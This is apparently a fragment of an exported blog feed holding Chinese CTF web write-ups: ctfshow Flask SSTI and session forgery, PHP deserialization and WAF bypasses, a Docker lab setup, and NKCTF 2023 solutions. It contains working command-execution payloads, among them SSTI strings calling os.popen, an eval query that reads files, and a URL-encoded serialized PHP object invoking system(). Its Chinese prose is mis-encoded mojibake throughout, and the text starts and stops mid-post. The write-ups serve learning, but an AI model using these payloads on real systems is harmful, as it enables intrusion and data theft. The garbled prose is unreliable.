\n\n`{{get_flashed_messages.__globals__['os'].popen('whoami').read()}}`\n\n`{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat ${HOME:0:1}[e-g]lag').read()}}` \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680569196-d457fb09-796e-4298-a9cc-6d686b500d42.png)\n\n# challenge_4 easy_flask\n\nè¿™é“é¢˜ç›®å¿«åšå‡ºæ¥äº†ï¼Œæœ€åä¸€æ­¥æ²¡æœ‰å»è¯»å–å½“å‰ç›®å½•ä¸‹çš„app.pyçš„æ–‡ä»¶å»çœ‹æºç ï¼ŒçœŸç»™è‡ªå·±æ— è¯­ä½äº†ï¼Œè„‘å­è¢«å¤§ä¾¿çŒäº†ä¸€æ ·\n\nå›åˆ°é¢˜ç›®ï¼š\n\nçœ‹æ ‡é¢˜è¿˜æ˜¯å…³äºflaskæ¨¡æ¿çš„æ¼æ´\n\nç”³è¯·ä¸€ä¸ªè´¦å·è¿›å»\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681197676-57ac85a1-3064-41a1-83d0-732cb4a05b0d.png)\n\næœ€åä¸€å¥è¯ä»–è¯´åªä¼šç»™adminç»™ä¸€äº›ä¸œè¥¿ï¼Œé‚£ä¹ˆç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œflaskæ¨¡æ¿å¸¸è§çš„sessionä¼ªé€ ï¼Œæ‰¾ä¸€ä¸ªè„šæœ¬ä¼ªé€ å°±è¡Œäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681282376-730ae4d5-a1ae-4d8f-a582-40b6713c5101.png)\n\nä¹‹åç»™åˆ°ä¸€ä¸ªå‡çš„flag ç„¶åæ³¨æ„åˆ°ä»–è¯·æ±‚æ–¹å¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681334740-bdbc1132-befd-4deb-b14f-7f1c618c8af1.png)\n\nä»–ç°åœ¨ç»™çš„æºä»£ç åªæ˜¯ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬åº”è¯¥é€šè¿‡è¯»app.pyæ¥è·å–å®Œæ•´çš„æºä»£ç \n\n```php\n# app.py\nfrom flask import Flask, render_template, request, redirect, url_for, session, send_file, Response\n\n\napp = Flask(__name__)\n\n\napp.secret_key = 'S3cr3tK3y'\n\nusers = {\n    'admin': {'password': 'LKHSADSFHLA;KHLK;FSDHLK;ASFD', 'role': 'admin'}\n}\n\n\n\n@app.route('/')\ndef index():\n    # Check if user is loggedin\n    if 'loggedin' in session:\n        return redirect(url_for('profile'))\n    return redirect(url_for('login'))\n\n@app.route('/login/', methods=['GET', 'POST'])\ndef login():\n    msg = ''\n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users and password == users[username]['password']:\n            session['loggedin'] = True\n            session['username'] = username\n            session['role'] = users[username]['role']\n            return redirect(url_for('profile'))\n        else:\n            msg = 'Incorrect username/password!'\n    return render_template('login2.html', msg=msg)\n\n\n@app.route('/register/', methods=['GET', 'POST'])\ndef register():\n    msg = '' \n    if request.method == 'POST' and 'username' in request.form and 'password' in request.form:\n        username = request.form['username']\n        password = request.form['password']\n        if username in users:\n            msg = 'Account already exists!'\n        else:\n            users[username] = {'password': password, 'role': 'user'}\n            msg = 'You have successfully registered!'\n    return render_template('register2.html', msg=msg)\n\n\n\n@app.route('/profile/')\ndef profile():\n    if 'loggedin' in session:\n        return render_template('profile2.html', username=session['username'], role=session['role'])\n    return redirect(url_for('login'))\n\n\n@app.route('/show/')\ndef show():\n    if 'loggedin' in session:\n        return render_template('show2.html')\n\n@app.route('/download/')\ndef download():\n    if 'loggedin' in session:\n        filename = request.args.get('filename')\n        if 'filename' in request.args:              \n            return send_file(filename, as_attachment=True)\n  \n    return redirect(url_for('login'))\n\n\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n    \n\n\n@app.route('/logout/')\ndef logout():\n   session.pop('loggedin', None)\n   session.pop('id', None)\n   session.pop('username', None)\n   session.pop('role', None)\n   return redirect(url_for('login'))\n\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0', port=8080)\n```\n\næ³¨æ„åˆ°è¿™é‡Œ å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ æ³¨æ„æ˜¯pythonçš„å‘½ä»¤æ‰§è¡Œå’Œphpçš„å½¢å¼ç¨æœ‰ä¸åŒ\n\n```php\n@app.route('/hello/')\ndef hello_world():\n    try:\n        s = request.args.get('eval')\n        return f\"hello,{eval(s)}\"\n    except Exception as e:\n        print(e)\n        pass\n        \n    return \"hello\"\n/hello/?eval=__import__('os').popen('ls /').read()\n/hello/?eval=__import__('os').popen('cat /flag_is_h3re').read()\n```\n\nç¨å¾®è§£é‡Šä¸€ä¸‹ è¿˜æ˜¯ä¸å¤ªç†Ÿæ‚‰pythonçš„å‘½ä»¤æ‰§è¡Œ æ˜¯é€šè¿‡è°ƒç”¨æ¨¡å—çš„æ–¹å¼\n\n**__import__()** å‡½æ•°ç”¨äºåŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°  \n\n**os** --- æ“ä½œç³»ç»Ÿæ¥å£æ¨¡å—\n\n**os.popen()** æ–¹æ³•ç”¨äºä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ã€‚  \n\n**read()** æ–¹æ³•ç”¨äºä»æ–‡ä»¶è¯»å–æŒ‡å®šçš„å­—èŠ‚æ•°ï¼Œå¦‚æœæœªç»™å®šæˆ–ä¸ºè´Ÿåˆ™è¯»å–æ‰€æœ‰ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681711491-461b37da-6ce3-4b0d-9b1b-f5be01576642.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681726881-b115297a-f1d5-4d07-9666-f4f38e5cf138.png)\n\n# Challenge_5 easy_php\n\næºç ï¼š\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass ctfshow{\n\n    public function __wakeup(){\n        die(\"not allowed!\");\n    }\n\n    public function __destruct(){\n        system($this->ctfshow);\n    }\n\n}\n\n$data = $_GET['1+1>2'];\n\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n\n\n?>\n```\n\nè¿™é“é¢˜ä¸ä¼šåšï¼Œçœ‹äº†wpè¿˜æ˜¯è›®ç¥å¥‡çš„ï¼Œç®€å•åˆ†æä¸€ä¸‹\n\nåº”è¯¥æ˜¯é€šè¿‡ååºåˆ—åŒ–å»æ‰§è¡Œctfshowç±»ä¸­çš„`system()`å‡½æ•°\n\nè¿™é‡Œé¦–å…ˆè§£é™¤ä¸€ä¸‹æˆ‘å›ºæœ‰çš„æƒ³æ³•ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå½“ååºåˆ—åŒ–æ—¶é¦–å…ˆä¼šæ‰§è¡Œ__wakeupé­”æœ¯æ–¹æ³•ï¼Œè¿™é“é¢˜æ‰§è¡Œåä¼šç”¨åˆ°die()å‡½æ•°ï¼Œç¨‹åºè¿è¡Œå®Œäº†ï¼Œæˆ‘åŸä»¥ä¸ºè¦é€šè¿‡å¢åŠ å¯¹è±¡å±æ€§æ–¹æ³•å»ç»•è¿‡__wakeupå‡½æ•°ï¼Œä½†æ˜¯å‘ç°æ²¡å¿…è¦ï¼Œå› ä¸ºææ„å‡½æ•°ä¸ä¼šå—åˆ°å½±å“ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680682560289-777732f6-fecf-4574-9c71-9b1cac882a4b.png)\n\næ‰€ä»¥æ²¡å¿…è¦å»ç»•è¿‡\n\né‚£ä¹ˆè¿™é“é¢˜ç›®æœ€ä¸»è¦çš„å°±æ˜¯å»ç»•è¿‡è¿™ä¸ªæ­£åˆ™åŒ¹é…\n\n```php\nif(!preg_match(\"/^[Oa]:[\\d]+/i\", $data)){\n    unserialize($data);\n}\n```\n\næˆ‘ä»¬ä¼ å‚ä¸èƒ½ä»¥Oæˆ–è€…aå¼€å¤´\n\næˆ‘ä»¬éƒ½çŸ¥é“åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²é¦–å­—æ¯å°±ä¸ºO æ„ä¸ºobjectå¯¹è±¡çš„æ„æ€\n\né‚£ä¹ˆè¿™é‡Œåº”è¯¥æ€ä¹ˆç»•è¿‡å‘¢\n\nè¿™é‡Œè€ƒåˆ°äº† PHP7.3 __wakeupç»•è¿‡ï¼ŒArrayObjectå†…ç½®ç±» å¹¶ä¸”è¿™ä¸ªç±»å¯ä»¥èµ·åˆ°ç±»ä¼¼äºååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œå½“ç„¶è¿™é‡Œè¯´çš„ä¸ä¸¥è°¨ï¼Œä½†å¯ä»¥è¿™æ ·ç†è§£å‚è€ƒï¼šhttps://juejin.cn/post/7105704360155283469 \n\næ³¨æ„è¿™é‡Œåªèƒ½åœ¨php7.3ç‰ˆæœ¬ä¸‹æ‰èƒ½æˆåŠŸï¼Œä¸€å¼€å§‹å¤ç°çš„æ—¶å€™æ²¡æ³¨æ„åˆ°\n\n ![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680683801763-77de8014-f72c-4c36-8e8e-b8016b18d2c3.png)\n\ncæ‰“å¤´\n\né‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆè¦ban aå­—ç¬¦å‘¢banäº†oå­—ç¬¦ä¸ä¹…è¡Œäº†å˜›\n\nå¦‚æœä¸ban a æˆ‘ä»¬å¯ä»¥ç›´æ¥åºåˆ—åŒ–æ•°ç»„å»åŒ…å«æˆ‘ä»¬çš„æ¶æ„ä»£ç ä»è€Œè¾¾åˆ°getshell\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684039061-77ce25bf-492d-4fea-ab53-dc14a69e04c2.png)\n\næ˜ç™½ä¹‹åï¼Œæœ¬åœ°æ„é€ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684422756-3957d554-5eb3-4b5a-b998-426f46960407.png)\n\nè¿™é‡Œä¼ å‚çš„æ—¶å€™è®°å¾—æŠŠ1+1>2 urlç¼–ç ä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680684325551-252a9b8d-ed0a-4898-9ddb-f3983e2a9f6e.png)\n\nä¹‹åå°±æ˜¯è¯»å–äº†ã€‚\n\n# åè®°ï¼š\n\nè¿™æ¬¡æœ€ä¸»è¦å­¦åˆ°äº†phpåŸç”Ÿç±»çš„çŸ¥è¯†ç‚¹æŠŠï¼Œtqlï¼ï¼ï¼ï¼\n\n","tags":["phpåŸç”Ÿç±»","flask sessionä¼ªé€ ","ssti"],"categories":["ctfshow"]},{"title":"è®°ä¸€æ¬¡ç®€å•çš„dockerå¼€è®¾webé¶åœº","url":"/post/5400d97d.html","content":"\nè®°å½•ä¸€æ¬¡ç®€å•çš„dockerå¼€è®¾webé¶åœº\n\n<!--more-->\n\n# å‰æœŸå‡†å¤‡ï¼š\n\nä¸€å°äº‘æœåŠ¡å™¨(è¿™é‡Œç”¨åˆ°äº†èˆå‹çš„æœåŠ¡å™¨==)\n\ndockerç¯å¢ƒ\n\n# æ­£æ–‡ï¼š\n\né¦–å…ˆè‡ªæˆ‘è®¤è¯†ä»€ä¹ˆæ˜¯dockerï¼Œdockerå°±åƒæ˜¯ä¸€ä¸ªè£…æ°´çš„æ¯å­ï¼Œåœ¨è¿™é‡ŒæŠŠé‡Œé¢çš„æ°´å«åšé•œåƒï¼Œæˆ‘ä»¬éœ€è¦å…ˆä¸‹è½½å¥½é•œåƒï¼Œå½“è¿è¡Œé•œåƒæ—¶ï¼Œdockerä¼šå…ˆåœ¨æœ¬åœ°å¯»æ‰¾æ‰€è¦æ‰“å¼€çš„é•œåƒï¼Œå¦‚æœæ‰¾ä¸åˆ°å°±ä¼šè‡ªåŠ¨ä»dockeré•œåƒä»“åº“ä¸‹è½½ã€‚\n\nè¿™é‡Œæˆ‘å·²ç»æå‰é…ç½®å¥½äº†dockerç¯å¢ƒ ä¸Šç½‘ä¸€æœæœ‰å¾ˆå¤šå®‰è£…æ•™ç¨‹\n\n`docker version`æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680239557401-3f605a8c-793d-4257-a9f8-8db90a07ff2f.png)\n\n`docker search lamp` æŸ¥æ‰¾lampå †æ ˆé•œåƒ\n\nLAMP å †æ ˆæ˜¯å¼€å‘äººå‘˜ç”¨æ¥æ„å»ºç½‘ç«™å’Œ Web åº”ç”¨ç¨‹åºçš„å››ç§ä¸åŒè½¯ä»¶æŠ€æœ¯çš„æ†ç»‘åŒ…ã€‚\n\nLAMP æ˜¯æ“ä½œç³»ç»Ÿ Linuxã€Web æœåŠ¡å™¨ Apacheã€æ•°æ®åº“æœåŠ¡å™¨ MySQL å’Œç¼–ç¨‹è¯­è¨€ PHP çš„é¦–å­—æ¯ç¼©å†™  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244378603-6e7e24e9-493e-4cb9-8dcd-89dcc1780d88.png)\n\n`docker pull  tutum/lamp`  ä¸‹è½½tutum/lampç‰ˆæœ¬çš„ \n\n`docker iamges` ä¸‹è½½å¥½ä¹‹åæŸ¥çœ‹æœ¬åœ°é•œåƒ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680244467495-06625797-38d0-4cbc-b25c-96cc941260bf.png)\n\nå°†é•œåƒå®ä¾‹åŒ– éœ€è¦åˆ†é…æœåŠ¡å™¨çš„ç«¯å£ è¿™é‡Œè¦åœ¨æœåŠ¡å™¨ç®¡ç†é¡µé¢ç»™å¼€æ”¾ä¸€ä¸ªç«¯å£ï¼ˆæ¯”å¦‚é˜¿é‡Œäº‘æˆ–è€…è…¾è®¯äº‘çš„æ§åˆ¶å°ï¼‰\n\n` docker run -d -p 9999:80 tutum/lamp  `è¿™é‡Œæˆ‘åˆ†é…çš„æ˜¯9999ç«¯å£\n\n`docker ps`æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨ï¼Œçœ‹åˆ°äº†æˆ‘ä»¬åˆšåˆšå¯åŠ¨çš„å®¹å™¨\n\n`docker ps -a`æ˜¯æŸ¥çœ‹æ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬å½“å‰ä¸è¿è¡Œçš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245286556-0ba73951-dc0a-4cfb-84ff-670601a7ca8c.png)\n\nè¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼ŒåŒºåˆ†é•œåƒå’Œå®¹å™¨çš„åŒºåˆ«ï¼Œä¸€ä¸ªé•œåƒå¯ä»¥å¼€å¾ˆå¤šä¸ªå®¹å™¨ï¼Œç”¨å®¹å™¨idæ¥åŒºåˆ†ç›¸åŒé•œåƒå®ä¾‹åŒ–äº§ç”Ÿä¸åŒçš„å®¹å™¨ï¼Œè¿™é‡Œè¿˜æ˜¯è¦æ³¨æ„è®°å½•ä¸€ä¸‹è‡ªå·±åœ¨ç”¨çš„å®¹å™¨idï¼Œä»¥å…è¯¯åˆ äº†ï¼Œæ•´ä¸ªå®¹å™¨ä¸­çš„ä½ å·²ç»å¼„å¥½çš„æ–‡ä»¶éƒ½ä¼šè¢«åˆ é™¤ã€‚\n\n`docker exec -it 1c0d6146aa65 bash` è¿›å…¥æˆ‘ä»¬åˆšåˆšå®ä¾‹åŒ–å¥½çš„å®¹å™¨é‡Œé¢\n\n`exit`é€€å‡ºå½“å‰æ‰€åœ¨çš„å®¹å™¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680245570215-8d68ad83-e2c9-4028-b1a2-b17b84d337d0.png)\n\næ¥ä¸‹æ¥å°±æ˜¯åœ¨/var/www/htmlæ–‡ä»¶ä¸‹çš„index.phpä¸‹æäº¤webé¢˜ç›®çš„æºç ï¼Œç„¶ååœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºflagçš„æ–‡ä»¶ï¼Œä¸€ä¸ªç®€å•çš„webé¶åœºå¤ç°ç¯å¢ƒå°±åˆ›å»ºå¥½äº†ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„å¤ç°é¢˜ç›®äº†ï¼\n\nè¿™é‡Œæˆ‘æ”¾äº†ä¸€ä¸ªæµ‹è¯•phpä»£ç å’Œæ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246463698-c3ceb1ae-e186-4943-a0af-ad5173eba16a.png)\n\nè¿˜æœ‰å°±æ˜¯è¿™ä¸ªlampå¼€çš„å®¹å™¨å†…æ˜¯æ²¡æœ‰vimç¼–è¾‘ç¯å¢ƒçš„ï¼Œå¦‚æœç›´æ¥æƒ³åœ¨å®¹å™¨å†…å†™ä»£ç çš„è¯ï¼Œå¯ä»¥åœ¨å®¹å™¨å†…å®‰è£…vimç¼–è¾‘å™¨ã€‚\n\næµè§ˆå™¨è®¿é—®ï¼š`124.221.177.174:9999`\n\næˆåŠŸä¸€ä¸ªç®€å•çš„webé¶åœºå°±æ­å»ºå¥½äº†ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680246392826-a865a0c6-42cc-4105-bcc0-b5dd202c356e.png)\n\nå¦‚æœæƒ³å…³é—­å®¹å™¨ï¼Œæ³¨æ„è¿™é‡Œä¸æ˜¯åˆ é™¤é•œåƒæ–‡ä»¶ï¼Œåªæ˜¯å…³é—­è¿™ä¸ªé•œåƒå®ä¾‹åŒ–çš„ä¸€ä¸ªå®¹å™¨ã€‚\n\n`docker stop å®¹å™¨id`å…³é—­å®¹å™¨\n\n`docker start å®¹å™¨id`æ‰“å¼€å®¹å™¨\n\n`docker rm å®¹å™¨id` åˆ é™¤å®¹å™¨ \n\n# ç»“å°¾ï¼š\n\nè¿™é‡Œæ­¥éª¤æˆªå›¾æ”¾çš„å›¾ç‰‡æš´éœ²äº†æœåŠ¡å™¨çš„å¤–ç½‘ipå’Œä¸€äº›å…¶ä»–ä¿¡æ¯ï¼Œå¤§ä½¬ä¸è¦æ¸—é€æˆ‘å•Šï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªçƒ­çˆ±ctfçš„å°èœé¸¡çš„ä¸€æ¬¡è®°å½•ç½¢äº†ï¼Œåœ¨çº¿æ±‚é¥¶QWQ\n","tags":["æ­å»º","docker"],"categories":["æ­å»º"]},{"title":"NKCTF 2023 WEB WP","url":"/post/8bc42760.html","content":"\nNKCTF 2023 éƒ¨åˆ†WEB WP\n\n<!--more-->\n\n# å‰è¨€\n\nè¿™æ¬¡ç¬¬ä¸€æ¬¡ç»„é˜Ÿï¼Œä¸èˆå‹ä¸€ä½pwné€‰æ‰‹(æ”»å…‹ä¸‰é“)ï¼Œæ‰“è¿˜æ˜¯è›®ä¸é”™çš„ä¸€æ¬¡ä½“éªŒï¼Œè™½ç„¶æ’åæ²¡æœ‰å¤šé å‰å§ï¼Œåç‰¢ä¸¤å¤©ç»ˆäºå•ƒä¸‹ä¸¤é“webé¢˜ç›®ï¼Œå¬è¯´å…¶ä»–éƒ½æ˜¯1dayï¼Œè¿˜æ˜¯å¤§ä½¬çš„æ¯”èµ›å•Šï¼Œæˆ‘è¿™ç§èœç‹—å°±å•ƒå•ƒç­¾åˆ°é¢˜ç›®ï¼Œä½†æ”¶è·è¿˜æ˜¯å¾ˆå¤šå•Šã€‚\n\næœ€ååªæ”»å…‹äº†ä¸‰é“ï¼Œä¹Ÿå†™å†™wpå§ï¼Œä¹Ÿç®—æ˜¯ç»™è‡ªå·±è®°å½•ä¸€ä¸‹ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679928004403-8a6fdc30-ca46-4faf-bb59-ba788d93bf12.png)\n\n# baby_php\n\næ”¾å‡ºæºç ï¼š\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'ItS SO CREAZY';\n        }\n        public function __destruct(){\n            if($this->name == 'welcome_to_NKCTF'){\n                echo $this->arg;\n            }\n        }\n    }\n\n    function waf($string){\n        if(preg_match('/f|l|a|g|\\*|\\?/i', $string)){\n            die(\"you are bad\");\n        }\n    }\n    class Happy{\n        public $shell;\n        public $cmd;\n        public function __invoke(){\n            $shell = $this->shell;\n            $cmd = $this->cmd;\n            waf($cmd);\n            eval($shell($cmd));\n        }\n    }\n    class Hell0{\n        public $func;\n        public function __toString(){\n            $function = $this->func;\n            $function();\n        }\n    }\n\n    if(isset($_GET['p'])){\n        unserialize($_GET['p']);\n    }else{\n        highlight_file(__FILE__);\n    }\n?>\n```\n\nä¸€é“ç»å…¸çš„ååºåˆ—åŒ–popé“¾rceé¢˜ç›®ï¼Œå°±æ˜¯æˆ‘å¡åœ¨æœ€åæ€ä¹ˆç»•wafå¾ˆä¹…ï¼Œæˆ‘å¤ªèœäº†ã€‚\n\npopé“¾æ„é€ å¾ˆç®€å•ï¼Œä¸»è¦è¯´è¯´wafçš„ç»•è¿‡æŠŠ\n\nwafåˆ†åˆ«ç¦äº†f l a g å­—ç¬¦è¿™å°±å¯¼è‡´å¾ˆå¤šlinuxå‘½ä»¤éƒ½ä¸èƒ½ç”¨äº† æ¯”å¦‚ls cat tac less tail \n\nç„¶åè¿˜ç¦äº†é€šé…ç¬¦`?` å’Œ`*`é˜²æ­¢æˆ‘ä»¬é€šè¿‡è¿™æ ·æ¨¡ç³Šæ“ä½œå»getshell  \n\nls å¯ä»¥é€šè¿‡ diræ¥ç»•è¿‡  è¯»æ–‡ä»¶ç”¨moreæ¥ç»•è¿‡\n\nç„¶åè¯»flagå°±æ˜¯å¾ˆå¤´ç–¼çš„äº‹æƒ…äº†ï¼Œè¿™é‡Œå°±æ˜¯å› ä¸ºä»–ç¦äº†é€šé…ç¬¦ç»™äº†æˆ‘å¯å‘\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679891817693-acfb04f2-5a0e-4435-97f9-fdba062697b5.png)\n\nå‚è€ƒï¼šhttps://abcfy2.gitbooks.io/linux_basic/content/first_sense_for_linux/command_learning/wildcard.html\n\nè¿˜æœ‰ä¸€ç§é€šé…ç¬¦æ˜¯`[]`å¯ä»¥åŒ¹é…æŒ‡å®šèŒƒå›´ä¸­çš„ä»»æ„å­—ç¬¦ é‚£ä¹ˆ få’Œgå°±å¯ä»¥ç”¨`[e-h]`æ¥ç»•è¿‡\n\naæ˜¯å­—æ¯è¡¨ç¬¬ä¸€ä¸ªï¼Œè¯¥æ€ä¹ˆç»•è¿‡å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ `[éæ•°å­—]`å½¢å¼:`[^0-9]` è¿™é‡Œå°–æ‹¬å·å°±æ˜¯æ’é™¤åŒ¹é…èŒƒå›´ï¼Œè¿™ä¹Ÿå°±å¯ä»¥åŒ…å«æ‰€æœ‰å­—æ¯ æ¥è¾¾åˆ°è·å–açš„æ•ˆæœäº†\n\næœ¬åœ°æ„é€ ï¼š\n\n```plain\n<?php\n    error_reporting(0);\n    class Welcome{\n        public $name;\n        public $arg = 'oww!man!!';\n        public function __construct(){\n            $this->name = 'welcome_to_NKCTF';\n        }\n    }\n\n    class Happy{\n        public $shell;\n        public $cmd;\n    }\n    class Hell0{\n        public $func;\n    }\n$a=new Welcome();\n$a->arg = new Hell0();\n$a->arg->func = new Happy();\n$a->arg->func->shell='system';    \n$a->arg->func->cmd=\"more  /[e-h]1[^0-9][e-h]\";\necho urlencode(serialize($a));\n?>\n```\n\nè®°å¾—æœ€åpayload urlç¼–ç ä¸€ä¸‹ ååºåˆ—åŒ–é¢˜ç›®çš„å¸¸ç”¨å¥—è·¯äº†\n\n```\np=O%3A7%3A%22Welcome%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A16%3A%22welcome_to_NKCTF%22%3Bs%3A3%3A%22arg%22%3BO%3A5%3A%22Hell0%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A5%3A%22Happy%22%3A2%3A%7Bs%3A5%3A%22shell%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22cmd%22%3Bs%3A24%3A%22more++%2F%5Be-h%5D1%5B%5E0-9%5D%5Be-h%5D%22%3B%7D%7D%7D\n```\n\næ‹¿åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679892001266-d44e146e-ab39-40b0-98f5-4f46ab72ee96.png)\n\n# esay_php\n\næ”¾å‡ºæºç ï¼š\n\n```plain\n<?php \n    highlight_file(__FILE__);\n    error_reporting(0);\n    if($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b'])){\n        if((string)$_POST['c'] != (string)$_POST['d'] && sha1($_POST['c']) === sha1($_POST['d'])){\n            if($_GET['e'] != 114514 && intval($_GET['e']) == 114514){\n                if(isset($_GET['NS_CTF.go'])){\n                    if(isset($_POST['cmd'])){\n                        if(!preg_match('/[0-9a-zA-Z]/i', $_POST['cmd'])){\n                            eval($_POST['cmd']);\n                        }else{\n                            die('error!!!!!!');\n                        }\n                    }else{\n                        die('error!!!!!');\n                    }\n                }else{\n                    die('error!!!!');\n                }\n            }else{\n                die('error!!!');\n            }\n        }else{\n            die('error!!');\n        }\n    }else{\n        die('error!');\n    }\n?>\n```\n\nè¿™æ˜¯ä¸€é“md5å¼±ç›¸ç­‰ï¼Œsha1ç¢°æ’ï¼Œphpå­—ç¬¦ä¸²è§£æç‰¹æ€§è¿™é‡Œæ˜¯è€ƒphpå‘½åè§„åˆ™åˆæ³•ä¸å¦ï¼Œè¿˜æœ‰å°±æ˜¯æ— æ•°å­—å­—æ¯rceã€‚\n\n## sha1ç¢°æ’\n\næ¥çœ‹sha1ç¢°æ’ï¼š\n\nä¹‹å‰æœ‰åšè¿‡md5å¼ºç›¸ç­‰çš„é¢˜ç›®ï¼Œå› ä¸ºè¢«stringå¼ºè½¬åŒ–äº†ï¼Œæ‰€ä»¥ä¸€äº›å¸¸è§çš„æ•°ç»„ç»•è¿‡å°±ä¸èƒ½ç”¨äº†ï¼Œåªèƒ½è€å®ç”¨è„šæœ¬ç¢°æ’ï¼Œsha1å’Œmd5åšæ³•å¾ˆç›¸ä¼¼ã€‚\n\nsha1 â€” è®¡ç®—å­—ç¬¦ä¸²çš„ sha1 æ•£åˆ—å€¼\n\nåœ¨è¿™é‡Œå…ˆè¯´ä¸€è¯´md5å¼ºç±»å‹å­—ç¬¦ä¸²è½¬æ¢åç¢°æ’ç›¸ç­‰å§\n\nè¿™é‡Œæœ‰ä¸“é—¨md5ç¢°æ’çš„è„šæœ¬ï¼šhttps://blog.csdn.net/shuaicenglou3032/article/details/118197904 \n\næœ¬åœ°æµ‹è¯•\n\nå…ˆæ‹¿åˆ°æ•£åˆ—å€¼ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926136860-9c662264-fd6e-411f-9074-2a2201872239.png)\n\næœ¬åœ°å†™ä¸€ä¸ªæµ‹è¯•demo\n\næºç ï¼š\n\n```php\n<?php \nshow_source('index.php');\n$a=$_GET['a'];\n$b=$_GET['b'];\nif((string)$a != (string)$b && md5($a) === md5($b)){\n    echo \"yes\";\n}\nelse{\n    echo \"no\";\n}\n?>\n```\n\nè¿™é‡Œæµ‹è¯•æœ€å¥½åœ¨ä½ç‰ˆæœ¬phpä¸‹æµ‹è¯•ä¸ç„¶é«˜ç‰ˆæœ¬å·²ç»è¢«ä¿®å¤äº† æˆ‘è¿™é‡Œversionæ˜¯5.3.29\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679926309291-918ee00d-2b44-43fc-8424-04f9c2d48c25.png)\n\næµ‹è¯•æ˜¯å¯ä»¥é€šè¿‡è„šæœ¬ç¢°æ’\n\nå†æ¥çœ‹sha1()\n\nè¿™é‡Œæ²¡æœ‰æ‰¾åˆ°å…³äºsha1çš„ç¢°æ’è„šæœ¬ï¼Œä½†æ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªç¬¦åˆæ¡ä»¶çš„å€¼ï¼Œä¹‹åå†é‡åˆ°æ‹¿æ¥ç”¨å°±è¡Œã€‚\n\na=`%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5